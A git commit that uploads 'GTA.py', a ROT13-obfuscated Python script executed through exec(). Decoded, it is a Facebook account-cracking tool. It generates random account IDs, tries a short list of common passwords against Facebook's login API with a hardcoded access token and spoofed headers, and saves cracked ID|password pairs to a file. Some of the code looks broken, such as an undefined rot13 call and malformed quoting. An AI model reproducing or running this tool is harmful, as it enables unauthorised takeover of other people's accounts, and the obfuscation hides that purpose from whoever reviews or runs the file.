71ea8f5322ecb22d85106f23d6f68f5c3c56ddc0
Mftah-Mohammed-Marghani <mftahopn@gmail.com>
2024-09-02 17:32:59 +0200

    Add files via upload

---
+++ GTA.py
@@ -0,0 +1,141 @@
+# DECODER 13 Encryption
+encoded_data = '''#uggcf://g.zr/qrpbqre44
+vzcbeg bf,erdhrfgf,flf,gvzr,qngrgvzr
+abj = qngrgvzr.qngrgvzr.gbqnl()
+na = qngrgvzr.qngrgvzr.abj()
+na2 = qngrgvzr.qngrgvzr(2024,9,6,5,00)
+ubhef = (abj.ubhe)
+vs na > na2 be na == na2:
+ cevag('\033[1;31zGur Qngr : '+ fge(na))
+ cevag('\033[1;31zGur Rkc Qngr : '+ fge(na2))
+ gvzr.fyrrc(1)
+ pybpx_rzbwv = ['📱', '📱', '📱', '📱', '📱', '💀', '💀', '💀', '💀', '💀', '💀', '📱']
+ rkvg(0)
+ryfr: 
+ cevag('𓏳'*60)
+ cevag('\033[1;31z\a وقتك تم اطلع بقدرك : '+ fge(na2))
+ cevag('')
+ cevag('𓏳'*60)
+ cevag('\g\a\@DR_ZT  ')
+ cevag('\a\033[1;37z هني تحط شن تبي')
+ QrXb = '''''''''''cevag('𓏳'50)'''''''''''
+ 
+ gvzr.fyrrc(5)
+ bf.flfgrz('pyrne')
+ cnff
+#----------------------------[VZCBEG/ZBQHYR]-----------------------------------#
+vzcbeg erdhrfgf,of4,wfba,bf,flf,hhvq,enaqbz,qngrgvzr,gvzr,er
+vzcbeg heyyvo3,evpu,onfr64
+sebz evpu.znexqbja vzcbeg Znexqbja nf znex
+sebz evpu.pbyhzaf vzcbeg Pbyhzaf nf pby
+sebz evpu vzcbeg cerggl
+sebz evpu.grkg vzcbeg Grkg nf grxm
+sebz gvzr vzcbeg ybpnygvzr nf yg
+vzcbeg bf,gvzr,enaqbz,wfba,flf,qngrgvzr
+gel:
+    vzcbeg erdhrfgf
+rkprcg:
+    bf.flfgrz("cvc3 vafgnyy erdhrfgf")
+    vzcbeg erdhrfgf 
+sebz pbapheerag.shgherf vzcbeg GuernqCbbyRkrphgbe nf GuernqCbby
+#-----------------------------[YVAR]-----------------------------------#
+qrs yva():
+	cevag("\033[1;93z━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;31z")
+#----------------------------[QNGR]-----------------------------------#
+
+#----------------------------[PBYBE/PBQR]-----------------------------------#
+N = '\k1o[1;97z';E = '\k1o[38;5;196z';L = '\033[1;33z';T = '\k1o[38;5;46z';O = '\k1o[38;5;8z';T1 = '\k1o[38;5;48z';T2 = '\k1o[38;5;47z';T3 = '\k1o[38;5;48z';T4 = '\k1o[38;5;49z';T5 = '\k1o[38;5;50z';K = '\33[1;34z';K1 = '\k1o[38;5;14z';K2 = '\k1o[38;5;123z';K3 = '\k1o[38;5;122z';K4 = '\k1o[38;5;86z';K5 = '\k1o[38;5;121z';F = '\k1o[1;96z';Z = '\k1o[38;5;205z'
+#----------------------------[HFRE/NTRAG]-----------------------------------#
+qrs jvaqbjf():
+    nI=fge(enaqbz.pubvpr(enatr(10,20)))
+    N=s"Zbmvyyn/5.0 (Jvaqbjf; H; Jvaqbjf AG {fge(enaqbz.pubvpr(enatr(5,7)))}.1; ra-HF) NccyrJroXvg/534.{nI} (XUGZY, yvxr Trpxb) Puebzr/{fge(enaqbz.pubvpr(enatr(8,12)))}.0.{fge(enaqbz.pubvpr(enatr(552,661)))}.0 Fnsnev/534.{nI}"
+    oI=fge(enaqbz.pubvpr(enatr(1,36)))
+    ok=fge(enaqbz.pubvpr(enatr(34,38)))
+    om=s"5{ok}.{oI}"
+    O=s"Zbmvyyn/5.0 (Jvaqbjf AG {fge(enaqbz.pubvpr(enatr(5,7)))}.{fge(enaqbz.pubvpr(['2','1']))}) NccyrJroXvg/{om} (XUGZY, yvxr Trpxb) Puebzr/{fge(enaqbz.pubvpr(enatr(12,42)))}.0.{fge(enaqbz.pubvpr(enatr(742,2200)))}.{fge(enaqbz.pubvpr(enatr(1,120)))} Fnsnev/{om}"
+    pI=fge(enaqbz.pubvpr(enatr(1,36)))
+    pk=fge(enaqbz.pubvpr(enatr(34,38)))
+    pm=s"5{pk}.{pI}"
+    P=s"Zbmvyyn/5.0 (Jvaqbjf AG 6.{fge(enaqbz.pubvpr(['2','1']))}; JBJ64) NccyrJroXvg/{pm} (XUGZY, yvxr Trpxb) Puebzr/{fge(enaqbz.pubvpr(enatr(12,42)))}.0.{fge(enaqbz.pubvpr(enatr(742,2200)))}.{fge(enaqbz.pubvpr(enatr(1,120)))} Fnsnev/{pm}"
+    Q=s"Zbmvyyn/5.0 (Jvaqbjf AG 10.0; Jva64; k64) NccyrJroXvg/537.36 (XUGZY, yvxr Trpxb) Puebzr/121.0.{fge(enaqbz.pubvpr(enatr(1,7120)))}.0 Fnsnev/537.36"
+    erghea enaqbz.pubvpr([N,O,P,Q])
+#----------------------------[YBTB]-----------------------------------#
+ybtb = (s"""        
+\k1o[1;31z$$$$$$$\  $$$$$$$$\  $$$$$$\  
+\k1o[1;31z$$  __$$\ $$  _____|$$  __$$\ 
+\k1o[1;31z$$ |  $$ |$$ |      $$ /  \__|
+\k1o[1;31z$$ |  $$ |$$$$$\    $$ |      
+\k1o[1;31z$$ |  $$ |$$  __|   $$ |      
+\k1o[1;34z$$ |  $$ |$$ |      $$ |  $$\ 
+\k1o[1;34z$$$$$$$  |$$$$$$$$\ \$$$$$$  |
+\k1o[1;34z\_______/ \________| \______/                                                                                                                                                                    
+===========================================
+\k1o[1;32z Bjare   :\k1o[1;32z Cvqv
+\k1o[1;32z Gbbyf    : \k1o[1;32zTGN/Qrpbqre
+\k1o[1;32zGryrtenz: \k1o[1;32z@DR_ZT
+==========================================='""")
+#----------------------------[ZNVA/QRS]-----------------------------------#
+qrs znva():
+    hfre=[]
+    bf.flfgrz("pyrne")
+    cevag(ybtb)
+    cevag(s'\033[1;31z[\033[1;37z=\033[1;31z] \033[1;37zRKNZCYR    \033[1;33z : \033[1;37z5000/10000/99999')
+    yva()
+    yvzvg=vachg(s"\033[1;31z[\033[1;37z?\033[1;31z]\033[1;37z VACHG \033[1;31z\033[1;37z: ")
+    yva()
+    bf.flfgrz('pyrne')
+    cevag(ybtb)
+    cevag(s'\033[1;31z[\033[1;37z1\033[1;31z] \033[1;37z2010-2014 ')
+    yva()
+    nfx=vachg(s"\033[1;31z[\033[1;37z?\033[1;31z] VACHG \033[1;37z:\033[1;33z ")
+    yva()
+    vs nfx va["1"]:
+        arjeva="10000"
+        sbe v va enatr(vag(yvzvg)):
+            qngn=fge(enaqbz.pubvpr(enatr(1000000000,1999999999)))
+            hfre.nccraq(qngn)
+    jvgu GuernqCbby(znk_jbexref=40) nf Gk:
+        bf.flfgrz('pyrne')
+        cevag(ybtb)
+        cevag(s'\k1o[38;5;196z[\k1o[38;5;46z=\k1o[38;5;196z]\k1o[38;5;46z GBGNY VQ : {yvzvg} \k1o[38;5;196z')
+        cevag(s'\k1o[38;5;196z[\k1o[38;5;46z+\k1o[38;5;196z]\k1o[38;5;46z GHEA \k1o[38;5;196z[\k1o[38;5;46zBA\k1o[38;5;196z/\k1o[38;5;46zBSS\k1o[38;5;196z]\k1o[38;5;46z NVECYNAR ZBQR RIREL 3 ZVA')
+        yva()
+        sbe puva va hfre:
+            hvq=arjeva+puva
+            Gk.fhozvg(ybtva,hvq)    
+ybbc=0
+bxf=[]
+qrs ybtva(hvq):
+    tybony bxf,ybbc
+    Frffvba=erdhrfgf.frffvba()
+    gel:
+        flf.fgqbhg.jevgr(s'\e\k1o[38;5;196z[\k1o[38;5;48zQRP-BX\k1o[38;5;196z]\k1o[1;97z-\k1o[38;5;196z[\033[1;37z{ybbc}\k1o[38;5;196z]\k1o[1;97z-\k1o[38;5;196z[\k1o[38;5;46zBX•{yra(bxf)}\k1o[38;5;196z]')
+        flf.fgqbhg.syhfu()
+        sbe cj va ["123456","1234567","12345678","123456789","123123","143143"]:
+            urnqref = {
+            "k-so-pbaarpgvba-onaqjvqgu": fge(enaqbz.enaqvag(20000000.0, 30000000.0)), 
+            "k-so-fvz-uav": fge(enaqbz.enaqvag(20000, 40000)), 
+            "k-so-arg-uav": fge(enaqbz.enaqvag(20000, 40000)), 
+            "k-so-pbaarpgvba-dhnyvgl": "RKPRYYRAG",
+            "k-so-pbaarpgvba-glcr": "pryy.PGEnqvbNpprffGrpuabybtlUFQCN",
+            "hfre-ntrag": jvaqbjf(), 
+            "pbagrag-glcr": "nccyvpngvba/k-jjj-sbez-heyrapbqrq", 
+            "k-so-uggc-ratvar": "Yvtre"}
+            ec=Frffvba.trg("uggcf://o-ncv.snprobbx.pbz/zrgubq/nhgu.ybtva?sbezng=wfba&rznvy="+fge(hvq)+"&cnffjbeq="+fge(cj)+"&perqragvnyf_glcr=qrivpr_onfrq_ybtva_cnffjbeq&trarengr_frffvba_pbbxvrf=1&reebe_qrgnvy_glcr=ohggba_jvgu_qvfnoyrq&fbhepr=qrivpr_onfrq_ybtva&zrgn_vas_sozrgn=%20¤gyl_ybttrq_va_hfrevq=0&zrgubq=TRG&ybpnyr=ra_HF&pyvrag_pbhagel_pbqr=HF&so_ncv_pnyyre_pynff=pbz.snprobbx.sbf.urnqrefi2.so4nbepn.UrnqrefI2PbasvtSrgpuErdhrfgUnaqyre&npprff_gbxra=350685531728|62s8pr9s74o12s84p123pp23437n4n32&so_ncv_erd_sevraqyl_anzr=nhguragvpngr&pcy=gehr", urnqref=urnqref).wfba()
+            vs "frffvba_xrl" va ec:
+                cevag(s"\e\e\033[1;30z[\033[1;33zQRP-BX\033[1;30z]\033[1;33z {hvq} {N}•{T} {cj}")
+                bcra("/fqpneq/BYQ-BX","n").jevgr(hvq+"|"+cj+"\a")
+                bxf.nccraq(hvq)
+                oernx 
+            ryvs "jjj.snprobbx.pbz" va ec["reebe_zft"]:
+                cevag(s"\e\e\033[1;30z[\033[1;33zQRP-BX\033[1;30z]\033[1;33z {hvq} {N}•{T} {cj}")
+                bcra("/fqpneq/BYQ-BX.gkg","n").jevgr(hvq+"|"+cj+"\a")
+                bxf.nccraq(hvq)
+                oernx
+            ryfr:pbagvahr
+        ybbc+=1
+    rkprcg:cnff
+znva()
+#----------------------------[PBQR/RAQ]-----------------------------------#''' 
+decoded_code = rot13(encoded_data)
+exec(decoded_code)
